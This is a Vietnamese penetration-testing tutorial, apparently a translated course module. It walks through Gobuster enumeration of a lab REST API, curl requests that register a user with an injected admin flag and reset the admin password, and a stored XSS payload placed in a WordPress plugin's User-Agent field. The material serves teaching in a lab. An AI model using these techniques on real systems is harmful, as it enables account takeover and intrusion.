Disallow: /index.html?
Disallow: /?
Allow: /?hl=
...
```

                                                     *Danh sách 7 - [https://www.google.com/robots.txt](https://www.google.com/robots.txt)*

Allow và Disallow là các chỉ thị cho các web crawler cho biết các trang hoặc thư mục mà các crawler "lịch sự" có thể hoặc không thể truy cập, tương ứng. Trong hầu hết các trường hợp, các trang và thư mục được liệt kê có thể không thú vị, và một số thậm chí có thể không hợp lệ. Tuy nhiên, không nên bỏ qua các tệp sitemap vì chúng có thể chứa manh mối về bố cục trang web hoặc thông tin thú vị khác, chẳng hạn như các phần chưa được khám phá của mục tiêu.

---

## 3.3. Liệt kê và Lạm dụng API

---

Trong nhiều trường hợp, mục tiêu kiểm thử xâm nhập của chúng ta là một ứng dụng web đóng, do nội bộ phát triển và đi kèm một số Giao diện Lập trình Ứng dụng (API). Các API này chịu trách nhiệm tương tác với logic back-end và cung cấp một xương sống chức năng vững chắc cho ứng dụng web.

Một loại API cụ thể có tên Representational State Transfer (REST) được sử dụng cho nhiều mục đích, bao gồm xác thực.

Trong kịch bản kiểm thử hộp trắng điển hình, chúng ta sẽ nhận được tài liệu API đầy đủ để giúp lập bản đồ toàn bộ bề mặt tấn công. Tuy nhiên, khi thực hiện kiểm thử hộp đen, chúng ta sẽ cần tự khám phá API của mục tiêu.

Chúng ta có thể sử dụng các tính năng của Gobuster để brute force các endpoint API. Trong kịch bản thử nghiệm này, máy chủ cổng API (API gateway) của chúng ta lắng nghe trên cổng 5001 tại 192.168.50.16, vì vậy chúng ta có thể thử tấn công brute force thư mục.

Các đường dẫn API thường theo sau bởi số phiên bản, dẫn đến một mẫu như:

```
/api_name/v1
```

                                                   *Danh sách 8 - Quy ước đặt đường dẫn API*

Tên API thường mô tả khá rõ ràng về chức năng hoặc dữ liệu mà nó sử dụng để vận hành, theo sau ngay bởi số phiên bản.

Với thông tin này, hãy thử brute force các đường dẫn API bằng cách dùng một wordlist cùng tính năng pattern của Gobuster. Chúng ta có thể gọi tính năng này bằng tùy chọn -p và cung cấp một tệp chứa các mẫu. Cho bài thử, chúng ta sẽ tạo một tệp pattern đơn giản trên hệ thống Kali chứa nội dung sau:

```
{GOBUSTER}/v1
{GOBUSTER}/v2
```

                                                          *Danh sách 9 - Mẫu pattern cho Gobuster*

Trong ví dụ này, chúng ta sử dụng placeholder “{GOBUSTER}” để khớp với bất kỳ từ nào từ wordlist, sau đó sẽ được nối với số phiên bản. Để giữ bài thử đơn giản, chúng ta sẽ thử chỉ hai phiên bản.

Giờ chúng ta sẵn sàng liệt kê API với gobuster bằng lệnh sau:

```
kali@kali:~$ gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.50.16:5001
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Patterns:                pattern (1 entries)
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/04/06 04:19:46 Starting gobuster in directory enumeration mode
===============================================================
/books/v1             (Status: 200) [Size: 235]
/console              (Status: 200) [Size: 1985]
/ui                   (Status: 308) [Size: 265] [--> http://192.168.50.16:5001/ui/]
/users/v1             (Status: 200) [Size: 241]
```

                                                  *Danh sách 10 - Bruteforce các đường dẫn API*

Chúng ta đã phát hiện nhiều kết quả, bao gồm hai mục đáng chú ý có vẻ là các endpoint API, /books/v1 và /users/v1.

*Nếu chúng ta duyệt tới đường dẫn /ui, chúng ta sẽ phát hiện toàn bộ tài liệu của API. Mặc dù điều này là phổ biến trong kiểm thử hộp trắng, nhưng không phải là điều xa xỉ mà chúng ta thường có trong kiểm thử hộp đen.*

Trước tiên, hãy kiểm tra API /users bằng curl.

```
kali@kali:~$ curl -i http://192.168.50.16:5002/users/v1
HTTP/1.0 200 OK
Content-Type: application/json
Content-Length: 241
Server: Werkzeug/1.0.1 Python/3.7.13
Date: Wed, 06 Apr 2022 09:27:50 GMT

{
  "users": [
    {
      "email": "mail1@mail.com",
      "username": "name1"
    },
    {
      "email": "mail2@mail.com",
      "username": "name2"
    },
    {
      "email": "admin@mail.com",
      "username": "admin"
    }
  ]
}
```

                                            *Danh sách 11 - Thu thập thông tin Người dùng*

Ứng dụng trả về ba tài khoản người dùng, bao gồm một tài khoản quản trị có vẻ đáng để điều tra thêm. Chúng ta có thể dùng thông tin này để thử một cuộc tấn công brute force khác với gobuster, lần này nhắm vào người dùng admin với một wordlist nhỏ hơn. Để xác minh xem có thuộc tính API nào liên quan tới thuộc tính username hay không, chúng ta sẽ mở rộng đường dẫn API bằng cách chèn username admin ở cuối.

```
kali@kali:~$ gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.50.16:5001/users/v1/admin/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/04/06 06:40:12 Starting gobuster in directory enumeration mode
===============================================================
/email                (Status: 405) [Size: 142]
/password             (Status: 405) [Size: 142]

===============================================================
2022/04/06 06:40:35 Finished
===============================================================
```

                                                        *Danh sách 12 - Khám phá thêm các API*

Đường dẫn API password có vẻ hấp dẫn cho mục đích thử nghiệm của chúng ta, vì vậy chúng ta sẽ thăm dò nó qua curl.

```
kali@kali:~$ curl -i http://192.168.50.16:5002/users/v1/admin/password
HTTP/1.0 405 METHOD NOT ALLOWED
Content-Type: application/problem+json
Content-Length: 142
Server: Werkzeug/1.0.1 Python/3.7.13
Date: Wed, 06 Apr 2022 10:58:51 GMT

{
  "detail": "The method is not allowed for the requested URL.",
  "status": 405,
  "title": "Method Not Allowed",
  "type": "about:blank"
}
```

                                   *Danh sách 13 - Phát hiện các phương thức API không được hỗ trợ*

Thật thú vị, thay vì mã phản hồi 404 Not Found, chúng ta nhận 405 METHOD NOT ALLOWED, ngụ ý rằng URL được yêu cầu tồn tại, nhưng phương thức HTTP của chúng ta không được hỗ trợ. Mặc định, curl dùng phương thức GET khi thực hiện yêu cầu, vì vậy chúng ta có thể thử tương tác với API password bằng một phương thức khác, như POST hoặc PUT.

Cả hai phương thức POST và PUT, nếu được phép trên API cụ thể này, có thể cho phép chúng ta ghi đè thông tin xác thực người dùng (trong trường hợp này là mật khẩu quản trị viên).

Trước khi thử một phương thức khác, hãy xác minh liệu thông tin xác thực mới ghi đè có được chấp nhận hay không. Chúng ta có thể kiểm tra xem phương thức login có được hỗ trợ không bằng cách mở rộng URL gốc như sau:

```
kali@kali:~$ curl -i http://192.168.50.16:5002/users/v1/login
HTTP/1.0 404 NOT FOUND
Content-Type: application/json
Content-Length: 48
Server: Werkzeug/1.0.1 Python/3.7.13
Date: Wed, 06 Apr 2022 12:04:30 GMT

{ "status": "fail", "message": "User not found"}
```

                                                                     *Danh sách 14 - Kiểm tra API ‘login’*

Mặc dù chúng ta nhận thông báo 404 NOT FOUND, thông điệp trạng thái cho biết người dùng không được tìm thấy; một dấu hiệu rõ ràng khác rằng bản thân API tồn tại. Chúng ta chỉ cần tìm cách tương tác phù hợp.

Chúng ta biết một trong các username là admin, vì vậy có thể thử đăng nhập với username này và một mật khẩu giả để xác minh chiến lược là hợp lý.

Tiếp theo, chúng ta sẽ thử chuyển yêu cầu GET ở trên thành POST và cung cấp payload ở định dạng JSON1 yêu cầu. Hãy tạo yêu cầu bằng cách truyền username admin và mật khẩu giả làm dữ liệu JSON qua tham số -d. Chúng ta cũng sẽ chỉ định “json” là “Content-Type” bằng cách thêm header mới với -H.

```
kali@kali:~$ curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
{ "status": "fail", "message": "Password is not correct for the given username."}
```

                                                  *Danh sách 15 - Tạo yêu cầu POST tới API login*

Thông điệp trả về từ API cho thấy xác thực thất bại, nghĩa là các tham số API được tạo đúng.

Vì chúng ta không biết mật khẩu của admin, hãy thử hướng khác và kiểm tra xem chúng ta có thể đăng ký như một người dùng mới hay không. Điều này có thể dẫn đến một bề mặt tấn công khác.

Hãy thử đăng ký người dùng mới với cú pháp sau bằng cách thêm một cấu trúc dữ liệu JSON chỉ định username và password mong muốn:

```
kali@kali:~$curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/register

{ "status": "fail", "message": "'email' is a required property"}
```

                                               *Danh sách 16 - Thử đăng ký Người dùng mới*

API phản hồi với thông báo fail cho biết chúng ta cũng cần bao gồm địa chỉ email. Chúng ta có thể nhân cơ hội này để xác định xem có khóa quản trị nào có thể lạm dụng được không. Hãy thêm khóa admin, theo sau là giá trị True.

```
kali@kali:~$curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register
{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}
```

                                 *Danh sách 17 - Cố gắng đăng ký người dùng mới với quyền admin*

Vì chúng ta không nhận lỗi, có vẻ chúng ta đã đăng ký thành công một người dùng mới với quyền admin, điều đáng ra không được phép theo thiết kế. Tiếp theo, hãy thử đăng nhập bằng thông tin xác thực vừa tạo bằng cách gọi API login mà chúng ta đã phát hiện trước đó.

```
kali@kali:~$curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
{"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew", "message": "Successfully logged in.", "status": "success"}
```

                                                   *Danh sách 18 - Đăng nhập dưới quyền admin*

Chúng ta đã đăng nhập đúng và nhận được một token xác thực JWT. Để có bằng chứng rõ ràng rằng chúng ta là người dùng quản trị, chúng ta nên dùng token này để đổi mật khẩu người dùng admin.

Chúng ta có thể thử bằng cách giả mạo một yêu cầu POST nhắm vào API password.

```
kali@kali:~$ curl  \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
  -d '{"password": "pwned"}'

{
  "detail": "The method is not allowed for the requested URL.",
  "status": 405,
  "title": "Method Not Allowed",
  "type": "about:blank"
}
```

                                    *Danh sách 19 - Thử đổi Mật khẩu Quản trị bằng yêu cầu POST*

Chúng ta đã truyền khóa JWT trong header Authorization cùng mật khẩu mới.

Đáng tiếc, ứng dụng cho biết phương thức sử dụng không đúng, vì vậy chúng ta cần thử phương thức khác. Phương thức PUT (cùng PATCH) thường được dùng để thay thế một giá trị thay vì tạo mới qua POST, vì vậy hãy thử định nghĩa rõ ràng nó:

```
kali@kali:~$ curl -X 'PUT' \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
  -d '{"password": "pwned"}'
```

                                      *Danh sách 20 - Thử đổi Mật khẩu Quản trị bằng yêu cầu PUT*

Lần này chúng ta không nhận thông báo lỗi, vì vậy có thể giả định rằng backend của ứng dụng không ném lỗi. Để chứng minh cuộc tấn công thành công, chúng ta có thể thử đăng nhập với tư cách admin bằng mật khẩu mới đổi.

```
kali@kali:~$ curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
{"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzIxMjgsImlhdCI6MTY0OTI3MTgyOCwic3ViIjoiYWRtaW4ifQ.yNgxeIUH0XLElK95TCU88lQSLP6lCl7usZYoZDlUlo0", "message": "Successfully logged in.", "status": "success"}
```

                                      *Danh sách 21 - Đăng nhập thành công vào tài khoản admin*

Tuyệt! Chúng ta đã chiếm quyền tài khoản admin bằng cách khai thác một lỗi leo thang đặc quyền logic tồn tại trong API đăng ký.

Những sai sót lập trình kiểu này xảy ra ở nhiều mức độ khi xây dựng các ứng dụng web dựa vào API tùy chỉnh, thường do thiếu kiểm thử và các thực hành mã hóa an toàn.

Cho đến giờ, chúng ta dựa vào curl để đánh giá thủ công API của mục tiêu nhằm hiểu rõ hơn luồng lưu lượng tổng thể.

Tuy nhiên, cách tiếp cận này sẽ không mở rộng tốt khi số lượng API trở nên đáng kể. May mắn thay, chúng ta có thể tái hiện tất cả các bước trên ngay trong Burp.

Ví dụ, hãy lặp lại lần thử đăng nhập admin mới nhất và gửi nó tới proxy bằng cách thêm `--proxy 127.0.0.1:8080` vào lệnh. Khi xong, từ tab Repeater của Burp, chúng ta có thể tạo một yêu cầu trống mới và điền vào đó cùng dữ liệu như trước.

![image.png](image%2027.png)

                                      *Figure 23: Crafting a POST request in Burp for API testing*

Tiếp theo, chúng ta sẽ nhấp nút Send và kiểm tra phản hồi đến ở khung bên phải.

![image.png](image%2028.png)

                                                      *Figure 24: Inspecting the API response value*

Tuyệt! Chúng ta đã tái hiện cùng hành vi trong proxy, điều này bên cạnh các lợi thế khác còn cho phép lưu lại bất kỳ API đã kiểm thử trong cơ sở dữ liệu của nó để điều tra sau.

Khi đã kiểm thử một số API khác nhau, chúng ta có thể điều hướng tới tab Target rồi Site map. Tại đây, chúng ta có thể lấy toàn bộ sơ đồ các đường dẫn đã kiểm thử cho đến lúc này.

![image.png](image%2029.png)

                                            *Figure 18: Using the Site Map to organize API testing*

Từ Site map của Burp, chúng ta có thể theo dõi API đã phát hiện và chuyển tiếp bất kỳ yêu cầu đã lưu nào tới Repeater hoặc Intruder để kiểm thử thêm.

Trong Đơn vị Học tập này, chúng ta đã khám phá cách gỡ lỗi ứng dụng web qua bảng điều khiển trình duyệt và các công cụ phát triển mạng. Sau đó, chúng ta học REST API là gì, vai trò của chúng trong ứng dụng web, và cách tiếp cận kiểm thử hộp đen để tìm điểm yếu và lạm dụng chúng.

Trong Đơn vị Học tập tiếp theo, chúng ta sẽ tìm hiểu về một trong những lỗ hổng phổ biến và lan rộng nhất ảnh hưởng tới ứng dụng web, Cross-Site Scripting.

---

# 4. Cross-Site Scripting

---

Đơn vị Học tập này bao gồm các Mục tiêu Học tập sau:

- Hiểu các loại lỗ hổng Cross-Site Scripting
- Khai thác Cross-Site Scripting cơ bản
- Thực hiện leo thang đặc quyền thông qua Cross-Site Scripting

Một trong những đặc điểm quan trọng nhất của một ứng dụng web được bảo vệ tốt là **làm sạch dữ liệu (data sanitization)**, quá trình trong đó đầu vào của người dùng được xử lý để loại bỏ hoặc biến đổi tất cả các ký tự hoặc chuỗi nguy hiểm. Dữ liệu không được làm sạch cho phép kẻ tấn công chèn và có khả năng thực thi mã độc hại.

- **Cross-Site Scripting (XSS)** là một lỗ hổng khai thác sự tin tưởng của người dùng đối với một trang web bằng cách **chèn động nội dung** vào trang được hiển thị bởi trình duyệt của người dùng.

Trước đây, XSS từng được coi là một lỗ hổng có mức độ rủi ro thấp, nhưng ngày nay nó vừa **phổ biến vừa nguy hiểm**, cho phép kẻ tấn công chèn các script phía client, chẳng hạn như JavaScript, vào các trang web mà người dùng khác truy cập.

---

## 4.1. Lý thuyết về Stored và Reflected XSS

---

Các lỗ hổng XSS có thể được chia thành hai nhóm chính: stored (lưu trữ) hoặc reflected (phản chiếu).

**Stored XSS**, còn được gọi là **Persistent XSS**, xảy ra khi payload khai thác được lưu trữ trong cơ sở dữ liệu hoặc được máy chủ lưu tạm (cache). Ứng dụng web sau đó truy xuất payload này và hiển thị nó cho bất kỳ ai truy cập vào trang dễ bị tấn công. Chỉ một lỗ hổng Stored XSS duy nhất cũng có thể tấn công **tất cả người dùng** của trang web. Stored XSS thường tồn tại trong các phần mềm diễn đàn, đặc biệt là ở khu vực bình luận, đánh giá sản phẩm, hoặc bất kỳ nơi nào mà nội dung người dùng được lưu trữ và hiển thị lại sau đó.

**Reflected XSS** thường bao gồm payload trong một yêu cầu hoặc liên kết được tạo thủ công. Ứng dụng web lấy giá trị đó và chèn nó vào nội dung trang. Biến thể XSS này chỉ tấn công **người gửi yêu cầu hoặc người truy cập liên kết**. Reflected XSS thường xuất hiện trong các trường tìm kiếm và kết quả trả về, cũng như bất kỳ nơi nào đầu vào người dùng được phản ánh lại trong thông báo lỗi.

Cả hai biến thể trên đều có thể xuất hiện ở **phía client (trình duyệt)** hoặc **phía server**; ngoài ra còn có thể tồn tại dưới dạng **DOM-based**.

**DOM-based XSS** diễn ra hoàn toàn trong Document Object Model (DOM) của trang. Mặc dù chúng ta chưa đi sâu vào chi tiết ở đây, nhưng cần biết rằng trình duyệt sẽ phân tích cú pháp nội dung HTML của trang và tạo ra một mô hình DOM nội bộ. Dạng XSS này xảy ra khi DOM của trang bị sửa đổi bởi các giá trị do người dùng kiểm soát. DOM-based XSS có thể là stored hoặc reflected; điểm mấu chốt là XSS kiểu này xảy ra **khi trình duyệt phân tích nội dung trang và thực thi JavaScript được chèn vào**.

Bất kể payload XSS được truyền và thực thi theo cách nào, **script được chèn sẽ chạy trong ngữ cảnh của người dùng truy cập trang bị ảnh hưởng**. Điều này có nghĩa là trình duyệt của người dùng (chứ không phải ứng dụng web) sẽ thực thi payload XSS. Những cuộc tấn công này có thể gây hậu quả nghiêm trọng, bao gồm **chiếm phiên đăng nhập (session hijacking)**, **chuyển hướng người dùng tới trang độc hại**, **thực thi ứng dụng cục bộ dưới quyền người dùng đó**, hoặc thậm chí **tạo ra phiên bản web bị trojan hóa**.

Trong các phần tiếp theo, chúng ta sẽ khám phá một số dạng tấn công này.

---

## 4.2. Ôn lại JavaScript

---

JavaScript là một ngôn ngữ lập trình bậc cao đã trở thành một trong những thành phần chính của các ứng dụng web hiện đại. Tất cả các trình duyệt hiện đại đều bao gồm một engine JavaScript thực thi mã JavaScript ngay trong trình duyệt.

Khi một trình duyệt xử lý phản hồi HTTP từ server chứa HTML, trình duyệt tạo ra một cây DOM và hiển thị nó. DOM bao gồm tất cả các form, input, hình ảnh, v.v. liên quan đến trang web.

Vai trò của JavaScript là truy cập và sửa đổi DOM của trang, tạo ra trải nghiệm người dùng tương tác hơn. Từ góc nhìn của kẻ tấn công, điều này cũng có nghĩa là nếu chúng ta có thể chèn mã JavaScript vào ứng dụng, chúng ta có thể truy cập và sửa đổi DOM của trang. Với quyền truy cập vào DOM, chúng ta có thể chuyển hướng form đăng nhập, trích xuất mật khẩu và đánh cắp cookie phiên.

Giống như nhiều ngôn ngữ lập trình khác, JavaScript có thể gom một tập hợp các chỉ thị thành một hàm.

```jsx
function multiplyValues(x,y) {
  return x * y;
}

let a = multiplyValues(3, 5)
console.log(a)
```

                                                          *Danh sách 22 - Hàm JavaScript đơn giản*

Trong Danh sách 22, chúng ta khai báo một hàm tên là `multiplyValues` ở các dòng 1–3, hàm này nhận hai giá trị số nguyên làm tham số và trả về tích của chúng.

Ở dòng 5, chúng ta gọi `multiplyValues` bằng cách truyền hai giá trị số nguyên 3 và 5 làm tham số, và gán biến `a` bằng giá trị trả về của hàm.

Khi khai báo biến `a`, chúng ta không gán một kiểu cụ thể cho biến, vì JavaScript là một ngôn ngữ lỏng lẻo kiểu (loosely typed). Điều này có nghĩa là kiểu thực tế của biến `a` được suy luận là kiểu `Number` dựa trên kiểu của các đối số truyền vào hàm, vốn là các kiểu `Number`. Ở bước cuối cùng, ở dòng 6 chúng ta in giá trị của `a` ra console.

Chúng ta có thể kiểm chứng đoạn mã trên bằng cách mở công cụ dành cho nhà phát triển (developer tools) trong Firefox trên trang `about:blank` để tránh rối do bất kỳ thư viện tải thêm nào.

Khi trang trắng đã được tải, ta sẽ nhấp vào Web Console trong menu phụ Web Developer của Firefox hoặc sử dụng phím tắt `Ctrl+Shift+K` (C+B+k).

![image.png](image%2030.png)

                               *Figure 25: Testing the JavaScript Function in the Browser Console*

Từ bên trong Console, ta có thể thực thi hàm thử nghiệm và lấy kết quả trả về.

In giá trị ra console của trình duyệt là một kỹ thuật khác mà chúng ta có thể thêm vào bộ công cụ gỡ lỗi, và nó sẽ cực kỳ hữu ích khi phân tích mã JavaScript phức tạp hơn.

---

## 4.3. Xác định lỗ hổng XSS

---

Chúng ta có thể tìm các điểm có thể chèn XSS bằng cách kiểm tra ứng dụng web và xác định các trường nhập liệu (ví dụ trường tìm kiếm) chấp nhận đầu vào không được làm sạch, sau đó được hiển thị làm đầu ra trên các trang tiếp theo.

Khi đã xác định được điểm vào, ta có thể nhập các ký tự đặc biệt và quan sát đầu ra để xác định xem có ký tự đặc biệt nào được trả về mà không bị lọc hay không.

Những ký tự đặc biệt phổ biến nhất được sử dụng cho mục đích này bao gồm:

```bash
< > ' " { } ;
```

                                   *Danh sách 23 - Các ký tự đặc biệt cho HTML và JavaScript*

Hãy mô tả mục đích của những ký tự đặc biệt này. HTML dùng `<` và `>` để chỉ định các phần tử, các thành phần khác nhau tạo nên một tài liệu HTML. JavaScript dùng `{` và `}` trong khai báo hàm. Dấu nháy đơn (') và nháy đôi (") dùng để biểu thị chuỗi, và dấu chấm phẩy (`;`) dùng để đánh dấu kết thúc một câu lệnh.

Nếu ứng dụng không loại bỏ hoặc mã hóa những ký tự này, nó có thể dễ bị XSS vì ứng dụng sẽ diễn giải các ký tự như mã, từ đó cho phép chèn thêm mã.

Mặc dù có nhiều dạng mã hóa khác nhau, hai dạng phổ biến nhất mà ta sẽ gặp trong ứng dụng web là mã hóa HTML và mã hóa URL. Mã hóa URL, đôi khi gọi là percent encoding, dùng để chuyển các ký tự không phải ASCII và các ký tự dành riêng trong URL, ví dụ chuyển khoảng trắng thành `%20`.

Mã hóa HTML (hoặc character references) có thể được dùng để hiển thị các ký tự thường có ý nghĩa đặc biệt, như ký hiệu thẻ. Ví dụ, `&lt;` là tham chiếu ký tự cho `<`. Khi gặp loại mã hóa này, trình duyệt sẽ không coi ký tự là bắt đầu một phần tử, mà sẽ hiển thị ký tự thực tế như nó vốn có.

Nếu chúng ta có thể chèn những ký tự đặc biệt này vào trang, trình duyệt sẽ xử lý chúng như các phần tử mã. Khi đó, chúng ta có thể bắt đầu xây dựng mã sẽ được thực thi trong trình duyệt nạn nhân khi nó tải JavaScript đã bị chèn độc hại.

Chúng ta có thể cần dùng các tập ký tự khác nhau, tùy vào vị trí input được chèn vào. Ví dụ, nếu input của chúng ta được thêm giữa các thẻ `div`, ta sẽ cần chèn thẻ `script` của riêng mình và cần khả năng chèn `<` và `>` như một phần của payload. Nếu input của chúng ta được thêm bên trong một thẻ JavaScript đang tồn tại, có thể chỉ cần dấu nháy và dấu chấm phẩy để thêm mã của riêng ta.

---

## 4.4. XSS Cơ bản

---

Hãy minh họa XSS cơ bản bằng một cuộc tấn công đơn giản nhắm vào instance WordPress OffSec. Cài đặt WordPress đang chạy một plugin tên Visitors có lỗ hổng stored XSS. Tính năng chính của plugin là ghi lại dữ liệu khách truy cập trang web, bao gồm IP, source và trường User-Agent.

Mã nguồn của plugin có thể tải xuống từ trang web của nó. Nếu kiểm tra tệp database.php, ta có thể xác minh cách dữ liệu được lưu bên trong cơ sở dữ liệu WordPress:

```php
function VST_save_record() {
	global $wpdb;
	$table_name = $wpdb->prefix . 'VST_registros';

	VST_create_table_records();

	return $wpdb->insert(
				$table_name,
				array(
					'patch' => $_SERVER["REQUEST_URI"],
					'datetime' => current_time( 'mysql' ),
					'useragent' => $_SERVER['HTTP_USER_AGENT'],
					'ip' => $_SERVER['HTTP_X_FORWARDED_FOR']
				)
			);
}
```

                                     *Danh sách 24 - Kiểm tra hàm tạo bản ghi của Visitor Plugin*

Hàm PHP này chịu trách nhiệm phân tích các header yêu cầu HTTP khác nhau, bao gồm User-Agent, giá trị này được lưu trong trường useragent.

Tiếp theo, mỗi khi quản trị viên WordPress tải plugin Visitor, hàm sẽ thực thi đoạn mã sau từ start.php:

```php
$i=count(VST_get_records($date_start, $date_finish));
foreach(VST_get_records($date_start, $date_finish) as $record) {
    echo '
        <tr class="active" >
            <td scope="row" >'.$i.'</td>
            <td scope="row" >'.date_format(date_create($record->datetime), get_option("links_updated_date_format")).'</td>
            <td scope="row" >'.$record->patch.'</td>
            <td scope="row" ><a href="https://www.geolocation.com/es?ip='.$record->ip.'#ipresult">'.$record->ip.'</a></td>
            <td>'.$record->useragent.'</td>
        </tr>';
    $i--;
}
```

                                  *Danh sách 25 - Kiểm tra hàm hiển thị bản ghi của Visitors Plugin*

Từ mã trên, ta sẽ thấy giá trị record useragent được lấy từ cơ sở dữ liệu và chèn thẳng vào thẻ Table Data (td) HTML, mà không có bất kỳ dạng làm sạch dữ liệu nào.

Vì header User-Agent nằm dưới quyền kiểm soát của người dùng, ta có thể tạo một cuộc tấn công XSS bằng cách chèn một thẻ script gọi phương thức alert() để tạo hộp thoại bật lên. Do tác động hiển thị ngay lập tức, phương pháp này thường được dùng để xác minh rằng ứng dụng dễ bị XSS.

*Mặc dù ở đây chúng ta vừa thực hiện phương pháp kiểm thử hộp trắng, ta có thể phát hiện cùng lỗ hổng bằng cách thử plugin qua fuzzing header HTTP theo phương pháp hộp đen.*

Với Burp được cấu hình làm proxy và Intercept tắt, ta có thể bắt đầu tấn công bằng cách duyệt đến [http://offsecwp/](http://offsecwp/) bằng Firefox.

Sau đó ta sẽ vào Burp Proxy > HTTP History, nhấp phải vào request, và chọn Send to Repeater.

![image.png](image%2031.png)

                                                *Figure 26: Forwarding the request to the Repeater*

Chuyển sang tab Repeater, ta có thể thay thế giá trị User-Agent mặc định bằng một thẻ script bao gồm phương thức alert (`<script>alert(42)</script>`), rồi gửi yêu cầu.

![image.png](image%2032.png)

                                            *Figure 27: Forwarding the request to the Repeater*

Nếu server trả về mã 200 OK, ta có thể tự tin rằng payload đã được lưu trong cơ sở dữ liệu WordPress.

Để xác thực, hãy đăng nhập vào console admin tại [http://offsecwp/wp-login.php](http://offsecwp/wp-login.php) bằng thông tin admin/password.

Nếu ta điều hướng đến console plugin Visitors tại [http://offsecwp/wp-admin/admin.php?page=visitors-app%2Fadmin%2Fstart.php](http://offsecwp/wp-admin/admin.php?page=visitors-app%2Fadmin%2Fstart.php), ta sẽ thấy một hộp pop-up hiển thị số 42, chứng minh rằng việc chèn mã đã thành công.

![image.png](image%2033.png)

                                                      *Figure 28: Demonstrating the XSS vulnerability*

Tuyệt vời. Ta đã chèn một payload XSS vào cơ sở dữ liệu của ứng dụng web và nó sẽ được phục vụ cho bất kỳ quản trị viên nào tải plugin. Một cửa sổ alert đơn giản là ví dụ khá tầm thường so với những gì có thể thực hiện bằng XSS, vậy hãy thử điều gì đó thú vị hơn, như tạo một tài khoản quản trị mới.

---

## 4.5. Leo thang Đặc quyền qua XSS

---

Vì bây giờ chúng ta có thể lưu mã JavaScript bên trong ứng dụng WordPress mục tiêu và khiến nó được thực thi bởi người dùng admin khi tải trang, chúng ta đã sẵn sàng sáng tạo hơn và khám phá các đường hướng khác nhau để có được quyền quản trị.

Chúng ta có thể lợi dụng XSS để đánh cắp cookie và thông tin phiên (session) nếu ứng dụng sử dụng cấu hình quản lý phiên không an toàn. Nếu ta có thể đánh cắp cookie của một người dùng đã xác thực, ta có thể mạo danh người đó trên trang web mục tiêu.

Các website sử dụng cookie để theo dõi trạng thái và thông tin về người dùng. Cookie có thể được đặt với một số flag tùy chọn, trong đó hai flag đặc biệt quan tâm với chúng ta là: Secure và HttpOnly.

Flag Secure yêu cầu trình duyệt chỉ gửi cookie qua kết nối được mã hóa, như HTTPS. Điều này bảo vệ cookie khỏi việc gửi ở dạng văn bản rõ và bị chụp trên mạng.

Flag HttpOnly yêu cầu trình duyệt từ chối truy cập cookie từ JavaScript. Nếu flag này không được đặt, ta có thể sử dụng payload XSS để đánh cắp cookie.

Hãy xác minh bản chất của cookie phiên trong WordPress bằng cách đăng nhập trước với tư cách người dùng admin.

Tiếp theo, ta có thể mở Web Developer Tools, điều hướng tới tab Storage, rồi nhấp vào [http://offsecwp](http://offsecwp/) trong menu Cookies bên trái.

![image.png](image%2034.png)

                                                        *Figure 29: Inspecting WordPress Cookies*

Ta nhận thấy trình duyệt đã lưu sáu cookie khác nhau, nhưng chỉ có bốn là cookie phiên. Trong bốn cookie này, nếu loại trừ cookie wordpress_test_cookie không đáng kể, tất cả đều hỗ trợ tính năng HttpOnly.

Vì tất cả cookie phiên chỉ có thể được gửi qua HTTP, đáng tiếc là chúng cũng không thể bị truy xuất qua JavaScript thông qua vector tấn công của chúng ta. Ta sẽ cần tìm một góc tấn công khác.

Khi admin tải dashboard plugin Visitors chứa JavaScript được chèn, trình duyệt sẽ thực thi bất cứ mã nào ta đã cung cấp làm payload, cho dù đó là một popup alert đơn giản hay một hàm JavaScript phức tạp hơn.

Ví dụ, ta có thể tạo một hàm JavaScript thêm một tài khoản quản trị WordPress mới, vậy nên khi quản trị viên thực thi mã đã chèn, hàm đó sẽ chạy ngầm ở phía server thông qua trình duyệt của admin.

